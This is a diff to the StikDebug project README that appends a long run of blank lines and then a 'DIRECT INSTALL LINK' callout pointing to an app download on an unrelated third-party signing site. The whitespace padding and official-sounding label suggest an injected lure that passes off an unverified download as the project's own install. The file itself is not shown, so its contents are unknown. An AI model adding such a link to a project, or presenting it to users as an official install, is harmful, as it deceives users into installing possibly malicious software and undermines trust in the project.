@@ -145,3 +145,16 @@ We appreciate your time and effort in helping improve this project.
 [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/stephendev0/stikdebug)
 ## License
 StikDebug is licensed under **AGPL-3.0**. See [`LICENSE`](LICENSE) for details.
+
+
+
+
+
+
+
+
+
+
+
+> [!DIRECT INSTALL LINK]
+>[Click here to install](https://ipa.ipasign.cc/download/e7f5b0169cc6)
